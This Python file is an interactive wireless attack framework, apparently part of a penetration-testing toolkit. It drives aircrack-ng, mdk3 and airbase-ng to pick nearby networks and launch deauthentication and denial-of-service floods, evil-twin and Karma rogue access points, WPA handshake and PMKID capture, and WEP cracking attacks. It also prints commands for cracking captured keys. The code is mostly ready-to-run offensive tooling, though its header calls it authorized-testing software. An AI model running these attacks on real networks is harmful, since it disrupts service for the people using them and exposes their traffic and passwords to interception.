# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================

import subprocess
import sys
import os
import re
import json
import time
import glob
from pathlib import Path
from datetime import datetime

class WirelessAttackFramework:
    def __init__(self):
        self.config_file = Path.cwd() / 'wireless_attack_config.json'
        self.tool_paths = {}
        self.selected_interface = None
        self.target_network = None
        self.discovered_networks = []
        self.load_config()
        self.check_tools()

    def load_config(self):
        """Load tool paths from config"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self.tool_paths = config.get('tool_paths', {})
            except:
                self.tool_paths = {}

    def save_config(self):
        """Save tool paths to config"""
        config = {'tool_paths': self.tool_paths, 'last_updated': datetime.now().isoformat()}
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)

    def find_tool(self, tool_name):
        """Find tool path using which command"""
        try:
            result = subprocess.run(['which', tool_name], capture_output=True, text=True, check=True)
            return result.stdout.strip()
        except:
            return None

    def check_tools(self):
        """Verify required tools are available"""
        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
                         'mdk3', 'hostapd', 'dnsmasq', 'iptables']

        missing = []
        for tool in required_tools:
            if tool not in self.tool_paths or not Path(self.tool_paths[tool]).exists():
                path = self.find_tool(tool)
                if path:
                    self.tool_paths[tool] = path
                else:
                    missing.append(tool)

        if self.tool_paths:
            self.save_config()

        if missing:
            print(f"Warning: Missing tools: {', '.join(missing)}")
            print("Some attacks may not be available.")

    def get_available_interfaces(self):
        """Get wireless interfaces not currently in use"""
        interfaces = []

        # Check /sys/class/net for all wireless interfaces
        net_path = Path('/sys/class/net')
        if net_path.exists():
            for iface_dir in net_path.iterdir():
                if (iface_dir / 'wireless').exists():
                    iface = iface_dir.name

                    # Check if interface is not connected to a network
                    try:
                        result = subprocess.run(['sudo', 'iwconfig', iface],
                                              capture_output=True, text=True)
                        # iwconfig outputs to stderr on some systems, stdout on others
                        output = result.stderr + result.stdout

                        # Check if actually in use by a process
                        ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                        in_use_by_process = iface in ps_result.stdout

                        # Interface is available if:
                        # 1. Not associated with an AP (Not-Associated or ESSID:off/any)
                        # 2. OR in monitor mode but not being used by a process
                        # 3. Not connected to a network (has IP and ESSID)

                        if 'Mode:Monitor' in output:
                            # Monitor mode - check if actually in use
                            if not in_use_by_process:
                                interfaces.append(iface)
                        elif ('Not-Associated' in output or
                              'ESSID:off/any' in output or
                              'ESSID:""' in output or
                              'Access Point: Not-Associated' in output):
                            # Managed mode, not connected
                            interfaces.append(iface)
                        # If connected (has ESSID with value), exclude it

                    except Exception as e:
                        # If we can't check, include it anyway
                        interfaces.append(iface)

        return sorted(set(interfaces))

    def select_interface(self):
        """Prompt user to select attack interface"""
        interfaces = self.get_available_interfaces()

        if not interfaces:
            print("No available wireless interfaces found!")
            print("Ensure interfaces are not connected to networks.")
            return False

        print("\n" + "="*60)
        print("AVAILABLE WIRELESS INTERFACES")
        print("="*60)

        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")

        while True:
            try:
                choice = input("\nSelect interface for attacks (number): ").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    self.selected_interface = interfaces[idx]
                    print(f"Selected: {self.selected_interface}")
                    return True
                else:
                    print("Invalid selection.")
            except (ValueError, KeyboardInterrupt):
                print("\nCancelled.")
                return False

    def find_airodump_csv(self):
        """Find most recent airodump CSV file"""
        csv_files = glob.glob('*.csv')
        # Filter out kismet CSV files, but keep regular CSV files
        csv_files = [f for f in csv_files if not f.endswith('.kismet.csv') and not f.endswith('.log.csv')]

        if not csv_files:
            # Try log.csv format as fallback
            csv_files = glob.glob('*-01.log.csv')

        if not csv_files:
            return None

        # Get most recent file
        csv_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
        return csv_files[0]

    def parse_airodump_csv(self, csv_file):
        """Parse airodump CSV for target networks and associated clients"""
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Remove line continuations (fields that wrap to next line)
            content = content.replace('\n ', ' ')

            lines = content.split('\n')
            networks = []
            clients = {}  # Map of BSSID -> list of client MACs

            in_ap_section = True
            in_station_section = False
            header_found = False

            for line in lines:
                line = line.strip()

                if not line:
                    continue

                # Detect station section
                if 'Station MAC' in line:
                    in_ap_section = False
                    in_station_section = True
                    continue

                # Parse AP section
                if in_ap_section:
                    if 'BSSID' in line and 'ESSID' in line:
                        header_found = True
                        continue

                    if header_found:
                        fields = [f.strip() for f in line.split(',')]

                        if len(fields) >= 14:
                            bssid = fields[0]
                            channel = fields[3]
                            privacy = fields[5]
                            power = fields[8]
                            essid = fields[13] if fields[13] else '[Hidden]'

                            if ':' in bssid and len(bssid) >= 17:
                                networks.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'privacy': privacy,
                                    'power': power
                                })

                # Parse Station section
                elif in_station_section:
                    fields = [f.strip() for f in line.split(',')]

                    # Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
                    if len(fields) >= 6:
                        station_mac = fields[0]
                        bssid = fields[5]

                        # Only include associated clients (not "(not associated)")
                        if ':' in station_mac and ':' in bssid and 'not associated' not in bssid.lower():
                            if bssid not in clients:
                                clients[bssid] = []
                            if station_mac not in clients[bssid]:
                                clients[bssid].append(station_mac)

            # Store clients mapping
            self.clients_by_bssid = clients
            return networks

        except Exception as e:
            print(f"Error parsing CSV: {e}")
            return []

    def select_target_network(self):
        """Select target network from airodump data"""
        csv_file = self.find_airodump_csv()

        if not csv_file:
            print("\nNo airodump CSV files found in current directory.")
            print("Run airodump-ng first to scan for networks.")
            return False

        print(f"\nReading networks from: {csv_file}")
        self.discovered_networks = self.parse_airodump_csv(csv_file)

        if not self.discovered_networks:
            print("No networks found in CSV file.")
            return False

        print("\n" + "="*70)
        print("DISCOVERED NETWORKS")
        print("="*70)
        print(f"{'#':<3} {'BSSID':<18} {'ESSID':<25} {'CH':<4} {'PWR':<5} {'SEC':<10}")
        print("-"*70)

        for i, net in enumerate(self.discovered_networks, 1):
            print(f"{i:<3} {net['bssid']:<18} {net['essid']:<25} {net['channel']:<4} {net['power']:<5} {net['privacy']:<10}")

        while True:
            try:
                choice = input("\nSelect target network (number): ").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(self.discovered_networks):
                    self.target_network = self.discovered_networks[idx]
                    print(f"\nTarget set: {self.target_network['essid']} ({self.target_network['bssid']})")
                    return True
                else:
                    print("Invalid selection.")
            except (ValueError, KeyboardInterrupt):
                print("\nCancelled.")
                return False

    def display_attack_menu(self):
        """Display main attack menu"""
        print("\n" + "="*60)
        print("WIRELESS ATTACK MENU")
        print("="*60)
        print(f"Interface: {self.selected_interface}")
        if self.target_network:
            print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']}) CH:{self.target_network['channel']}")
        print("-"*60)
        print("1.  Deauthentication Attack")
        print("2.  Denial of Service Attacks (submenu)")
        print("3.  Evil Twin / Rogue AP")
        print("4.  Karma/MANA Attack")
        print("5.  Captive Portal Attack")
        print("6.  PMKID Capture")
        print("7.  WPA/WPA2 Handshake Capture")
        print("8.  WEP Attacks (submenu)")
        print("9.  Change Target Network")
        print("10. Change Interface")
        print("11. Exit")
        print("-"*60)

    def deauth_attack(self):
        """Execute deauthentication attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("DEAUTHENTICATION ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")
        print(f"Channel: {self.target_network['channel']}")

        # Get associated clients for this BSSID
        target_bssid = self.target_network['bssid']
        clients = self.clients_by_bssid.get(target_bssid, [])

        print(f"\nAssociated clients: {len(clients)}")
        if clients:
            for i, client in enumerate(clients, 1):
                print(f"  {i}. {client}")

        # Attack type selection
        print("\n1. Broadcast (all clients)")
        if clients:
            print("2. Specific client (from list above)")
            print("3. Manual client MAC entry")
        else:
            print("2. Manual client MAC entry")

        attack_type = input("Select attack type: ").strip()

        client_mac = None
        if attack_type == '2' and clients:
            # Select from list
            while True:
                try:
                    choice = input("Select client number: ").strip()
                    idx = int(choice) - 1
                    if 0 <= idx < len(clients):
                        client_mac = clients[idx]
                        break
                    else:
                        print("Invalid selection.")
                except (ValueError, KeyboardInterrupt):
                    print("Cancelled.")
                    return
        elif (attack_type == '3' and clients) or (attack_type == '2' and not clients):
            # Manual entry
            client_mac = input("Enter client MAC address: ").strip()

        packet_count = input("Packet count (0 for continuous, default 10): ").strip() or "10"

        # Set interface to target channel
        channel = self.target_network['channel'].strip()
        print(f"\nSetting interface to channel {channel}...")
        try:
            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                          check=True, capture_output=True)
            print(f"Interface set to channel {channel}")
        except subprocess.CalledProcessError as e:
            print(f"Warning: Could not set channel: {e}")
            print("Attack may fail if interface is on wrong channel.")

        cmd = ['sudo', self.tool_paths['aireplay-ng'], '--deauth', packet_count,
               '-a', self.target_network['bssid']]

        if client_mac:
            cmd.extend(['-c', client_mac])

        cmd.append(self.selected_interface)

        print(f"\nLaunching attack...")
        print(f"Command: {' '.join(cmd)}")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
            print("\nAttack completed.")
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def check_mdk3_and_guide(self):
        """Check for mdk3 and provide installation guidance"""
        if 'mdk3' not in self.tool_paths:
            mdk3_path = self.find_tool('mdk3')
            if mdk3_path:
                self.tool_paths['mdk3'] = mdk3_path
                self.save_config()
                print(f"Found mdk3 at: {mdk3_path}")
                return True
            else:
                print("\n" + "="*60)
                print("MDK3 NOT INSTALLED")
                print("="*60)
                print("mdk3 is required for Authentication DoS and Beacon Flood attacks.")
                print("\nTo install mdk3, run these commands:")
                print("-" * 60)
                print("sudo apt-get install build-essential libpcap-dev")
                print("git clone https://github.com/charlesxsh/mdk3-master.git")
                print("cd mdk3-master")
                print("make")
                print("sudo make install")
                print("-" * 60)
                print("\nAfter installation, restart this script.")
                input("\nPress Enter to continue...")
                return False
        return True

    def auth_dos_attack(self):
        """Execute authentication DoS attack"""
        if not self.target_network:
            print("No target selected.")
            return

        # Check if mdk3 is available
        if not self.check_mdk3_and_guide():
            return

        print("\n" + "="*50)
        print("AUTHENTICATION DOS ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        cmd = ['sudo', self.tool_paths['mdk3'], self.selected_interface, 'a',
               '-a', self.target_network['bssid']]

        print(f"\nLaunching attack...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def beacon_flood_attack(self):
        """Execute beacon flood attack"""
        # Check if mdk3 is available
        if not self.check_mdk3_and_guide():
            return

        print("\n" + "="*50)
        print("BEACON FLOOD ATTACK")
        print("="*50)

        essid_count = input("Number of fake APs (default 50): ").strip() or "50"

        cmd = ['sudo', self.tool_paths['mdk3'], self.selected_interface, 'b',
               '-n', essid_count, '-s', '1000']

        print(f"\nLaunching beacon flood...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def evil_twin_attack(self):
        """Execute evil twin / rogue AP attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("EVIL TWIN / ROGUE AP ATTACK")
        print("="*50)
        print(f"Cloning: {self.target_network['essid']}")
        print(f"Channel: {self.target_network['channel']}")

        cmd = ['sudo', self.tool_paths['airbase-ng'],
               '-e', self.target_network['essid'],
               '-c', self.target_network['channel'],
               '-a', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching evil twin AP...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def captive_portal_attack(self):
        """Execute captive portal attack"""
        print("\n" + "="*50)
        print("CAPTIVE PORTAL ATTACK")
        print("="*50)
        print("This attack requires additional setup:")
        print("1. Clone target portal with httrack")
        print("2. Modify forms to capture credentials")
        print("3. Setup web server, DNS, and DHCP")
        print("\nThis is a complex attack - implement manually or use specialized tools.")
        input("\nPress Enter to continue...")

    def dos_attacks_menu(self):
        """Denial of Service attacks submenu"""
        while True:
            print("\n" + "="*60)
            print("DENIAL OF SERVICE ATTACKS")
            print("="*60)
            if self.target_network:
                print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']})")
            print("-"*60)
            print("1. Authentication DoS (mdk3)")
            print("2. Beacon Flood (mdk3)")
            print("3. CTS Frame Flood")
            print("4. Back to main menu")
            print("-"*60)

            choice = input("\nSelect DoS attack (1-4): ").strip()

            if choice == '1':
                self.auth_dos_attack()
            elif choice == '2':
                self.beacon_flood_attack()
            elif choice == '3':
                self.cts_flood_attack()
            elif choice == '4':
                break
            else:
                print("Invalid selection.")

    def wep_attacks_menu(self):
        """WEP attacks submenu"""
        while True:
            print("\n" + "="*60)
            print("WEP ATTACKS (Legacy Networks)")
            print("="*60)
            if self.target_network:
                print(f"Target: {self.target_network['essid']} ({self.target_network['bssid']})")
            print("-"*60)
            print("1. Fake Authentication")
            print("2. ARP Replay Attack")
            print("3. Fragmentation Attack")
            print("4. ChopChop Attack")
            print("5. Crack WEP Key (aircrack-ng)")
            print("6. Back to main menu")
            print("-"*60)

            choice = input("\nSelect WEP attack (1-6): ").strip()

            if choice == '1':
                self.wep_fake_auth()
            elif choice == '2':
                self.wep_arp_replay()
            elif choice == '3':
                self.wep_fragmentation()
            elif choice == '4':
                self.wep_chopchop()
            elif choice == '5':
                self.wep_crack()
            elif choice == '6':
                break
            else:
                print("Invalid selection.")

    def karma_attack(self):
        """Execute Karma/MANA attack"""
        print("\n" + "="*50)
        print("KARMA/MANA ATTACK")
        print("="*50)
        print("This attack responds to all client probe requests,")
        print("tricking devices into connecting to your fake AP.")

        essid = input("\nFake AP ESSID (or press Enter for 'FreeWiFi'): ").strip() or "FreeWiFi"
        channel = input("Channel (1-11, default 6): ").strip() or "6"

        print("\nKarma attack creates an AP that responds to all probe requests.")
        print("Clients searching for networks may auto-connect.")

        # Use airbase-ng with -P flag for probe response
        cmd = ['sudo', self.tool_paths['airbase-ng'],
               '-e', essid,
               '-c', channel,
               '-P',  # Respond to all probes
               self.selected_interface]

        print(f"\nLaunching Karma attack...")
        print(f"ESSID: {essid}")
        print(f"Channel: {channel}")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def cts_flood_attack(self):
        """CTS frame flood attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("CTS FRAME FLOOD ATTACK")
        print("="*50)
        print(f"Target Channel: {self.target_network['channel']}")
        print("\nThis floods the channel with CTS frames,")
        print("blocking all communication.")

        # Check if mdk3 is available
        if not self.check_mdk3_and_guide():
            return

        cmd = ['sudo', self.tool_paths['mdk3'],
               self.selected_interface, 'c',
               '-c', self.target_network['channel']]

        print(f"\nLaunching CTS flood on channel {self.target_network['channel']}...")
        print("Press Ctrl+C to stop\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_fake_auth(self):
        """WEP fake authentication"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP FAKE AUTHENTICATION")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-1', '0',  # Fake auth
               '-a', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nAttempting fake authentication...")
        print("This associates with the AP for packet injection.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_arp_replay(self):
        """WEP ARP replay attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP ARP REPLAY ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")
        print("\nThis captures and replays ARP packets to generate IVs.")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-3',  # ARP replay
               '-b', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching ARP replay...")
        print("Waiting for ARP packet...\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_fragmentation(self):
        """WEP fragmentation attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP FRAGMENTATION ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-5',  # Fragmentation
               '-b', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching fragmentation attack...")
        print("This obtains keystream for packet injection.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_chopchop(self):
        """WEP chopchop attack"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WEP CHOPCHOP ATTACK")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        # Set channel
        channel = self.target_network['channel'].strip()
        subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                      capture_output=True)

        cmd = ['sudo', self.tool_paths['aireplay-ng'],
               '-4',  # Chopchop
               '-b', self.target_network['bssid'],
               self.selected_interface]

        print(f"\nLaunching chopchop attack...")
        print("This decrypts WEP packets without the key.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nAttack stopped.")

    def wep_crack(self):
        """Crack WEP key from capture"""
        print("\n" + "="*50)
        print("CRACK WEP KEY")
        print("="*50)

        cap_file = input("Enter capture file name (.cap): ").strip()

        if not Path(cap_file).exists():
            print(f"File {cap_file} not found.")
            return

        cmd = ['sudo', self.tool_paths['aircrack-ng'], cap_file]

        print(f"\nCracking WEP key from {cap_file}...")
        print("This requires at least 40,000-85,000 IVs.\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nCracking stopped.")

    def wpa_handshake_capture(self):
        """Capture WPA/WPA2 4-way handshake"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WPA/WPA2 HANDSHAKE CAPTURE")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")
        print(f"Channel: {self.target_network['channel']}")

        # Get associated clients
        target_bssid = self.target_network['bssid']
        clients = self.clients_by_bssid.get(target_bssid, [])

        if clients:
            print(f"\nAssociated clients found: {len(clients)}")
            for i, client in enumerate(clients, 1):
                print(f"  {i}. {client}")
        else:
            print("\nNo associated clients found in CSV.")
            print("You may need to wait for a client to connect,")
            print("or use deauth attack to force re-authentication.")

        output_file = f"handshake_{self.target_network['bssid'].replace(':', '')}"

        print(f"\nCapture will be saved to: {output_file}")
        print("\nOptions:")
        print("1. Passive capture (wait for natural authentication)")
        print("2. Active capture (deauth client to force re-auth)")

        choice = input("\nSelect capture mode (1-2): ").strip()

        if choice == '2':
            if not clients:
                print("\nNo clients to deauth. Running passive capture instead.")
                choice = '1'
            else:
                # Ask which client to deauth
                print("\nSelect client to deauthenticate:")
                print("0. All clients (broadcast)")
                for i, client in enumerate(clients, 1):
                    print(f"{i}. {client}")

                client_choice = input("\nSelect client (0 for all): ").strip()

                if client_choice == '0':
                    deauth_target = None  # Broadcast
                else:
                    try:
                        idx = int(client_choice) - 1
                        if 0 <= idx < len(clients):
                            deauth_target = clients[idx]
                        else:
                            print("Invalid selection, using broadcast.")
                            deauth_target = None
                    except ValueError:
                        print("Invalid input, using broadcast.")
                        deauth_target = None

        # Set interface to target channel
        channel = self.target_network['channel'].strip()
        print(f"\nSetting interface to channel {channel}...")
        try:
            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'channel', channel],
                          check=True, capture_output=True)
        except subprocess.CalledProcessError:
            print("Warning: Could not set channel")

        # Start airodump capture
        airodump_cmd = ['sudo', self.tool_paths['airodump-ng'],
                       '-c', channel,
                       '--bssid', self.target_network['bssid'],
                       '-w', output_file,
                       self.selected_interface]

        print(f"\nStarting handshake capture...")
        print("Waiting for WPA handshake...")

        if choice == '2':
            print("\nCapture started. Will deauth client in 5 seconds...")
            print("Watch for 'WPA handshake' message in airodump output")
            print("Press Ctrl+C when handshake is captured\n")

            # Start airodump in background
            import threading
            airodump_proc = subprocess.Popen(airodump_cmd)

            # Wait 5 seconds for airodump to start
            time.sleep(5)

            # Send deauth packets
            print("Sending deauth packets...")
            deauth_cmd = ['sudo', self.tool_paths['aireplay-ng'],
                         '--deauth', '5',
                         '-a', self.target_network['bssid']]

            if deauth_target:
                deauth_cmd.extend(['-c', deauth_target])

            deauth_cmd.append(self.selected_interface)

            try:
                subprocess.run(deauth_cmd, timeout=10)
            except:
                pass

            print("\nDeauth sent. Waiting for handshake...")
            print("Press Ctrl+C when you see 'WPA handshake' message\n")

            try:
                airodump_proc.wait()
            except KeyboardInterrupt:
                airodump_proc.terminate()
                airodump_proc.wait()
        else:
            # Passive mode
            print("\nPress Ctrl+C when handshake is captured\n")
            try:
                subprocess.run(airodump_cmd)
            except KeyboardInterrupt:
                pass

        print(f"\nCapture saved to: {output_file}-01.cap")
        print("\nTo crack the handshake:")
        print(f"  aircrack-ng -w /path/to/wordlist.txt {output_file}-01.cap")
        print(f"  hashcat -m 22000 {output_file}.hc22000 /path/to/wordlist.txt")

    def pmkid_capture(self):
        """Capture PMKID for WPA/WPA2 cracking"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("PMKID CAPTURE")
        print("="*50)
        print(f"Target: {self.target_network['essid']}")
        print(f"BSSID: {self.target_network['bssid']}")

        output_file = f"pmkid_{self.target_network['bssid'].replace(':', '')}"

        cmd = ['sudo', self.tool_paths['airodump-ng'],
               '-c', self.target_network['channel'],
               '--bssid', self.target_network['bssid'],
               '-w', output_file,
               self.selected_interface]

        print(f"\nCapturing PMKID...")
        print("Press Ctrl+C when capture is complete\n")

        try:
            subprocess.run(cmd)
            print(f"\nCapture saved to: {output_file}")
        except KeyboardInterrupt:
            print("\nCapture stopped.")

    def wps_attacks(self):
        """WPS attack menu"""
        if not self.target_network:
            print("No target selected.")
            return

        print("\n" + "="*50)
        print("WPS ATTACKS")
        print("="*50)
        print("WPS attacks require additional tools (reaver, bully, etc.)")
        print("Install these tools separately for WPS functionality.")
        input("\nPress Enter to continue...")

    def run(self):
        """Main program loop"""
        print("WIRELESS ATTACK FRAMEWORK")
        print("FOR AUTHORIZED SECURITY TESTING ONLY")
        print("="*60)

        # Select interface
        if not self.select_interface():
            return

        # Select target
        if not self.select_target_network():
            return

        # Main menu loop
        while True:
            try:
                self.display_attack_menu()
                choice = input("\nSelect attack (1-10): ").strip()

                if choice == '1':
                    self.deauth_attack()
                elif choice == '2':
                    self.dos_attacks_menu()
                elif choice == '3':
                    self.evil_twin_attack()
                elif choice == '4':
                    self.karma_attack()
                elif choice == '5':
                    self.captive_portal_attack()
                elif choice == '6':
                    self.pmkid_capture()
                elif choice == '7':
                    self.wpa_handshake_capture()
                elif choice == '8':
                    self.wep_attacks_menu()
                elif choice == '9':
                    self.select_target_network()
                elif choice == '10':
                    self.select_interface()
                elif choice == '11':
                    print("\nExiting...")
                    break
                else:
                    print("Invalid selection.")

            except KeyboardInterrupt:
                print("\n\nExiting...")
                break

def main():
    if os.geteuid() != 0:
        print("This tool requires root privileges.")
        print("Run with: sudo python3 attack_framework.py")
        sys.exit(1)

    framework = WirelessAttackFramework()
    framework.run()

if __name__ == "__main__":
    main()
